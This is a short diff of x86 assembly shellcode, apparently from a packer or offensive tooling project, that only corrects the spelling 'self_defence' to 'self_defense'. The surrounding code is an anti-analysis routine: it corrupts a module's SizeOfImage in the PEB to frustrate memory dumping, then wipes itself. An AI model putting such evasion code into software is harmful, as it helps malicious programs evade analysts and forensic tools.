@@ -2,7 +2,7 @@
 [ORG 0]
 
 	; Protect Current Process 
-self_defence:
+self_defense:
 	cld                        ; Clear direction flags
     call start          
 	%include "./blocks/block_api.asm"; Stephen Fewer's hash API from metasploit project
@@ -69,9 +69,9 @@ start:
   	mov ebx,[ebx+0x0C]              ; Get PEB->Ldr	
 	mov eax,[ebx + 0x0C]            ; InOrderModuleList
 	mov dword [eax+0x20],0xFFFFFF   ; SizeOfImage
-	; Wipe self defence shellcode
-total_size: equ $-self_defence      ; Set the size of the self defence shellcode to total_size label
-	mov ecx,total_size              ; Move the total size of the self defence shellcode to ECX
+	; Wipe self defense shellcode
+total_size: equ $-self_defense      ; Set the size of the self defense shellcode to total_size label
+	mov ecx,total_size              ; Move the total size of the self defense shellcode to ECX
 	call $+5
 	pop eax
 clean:
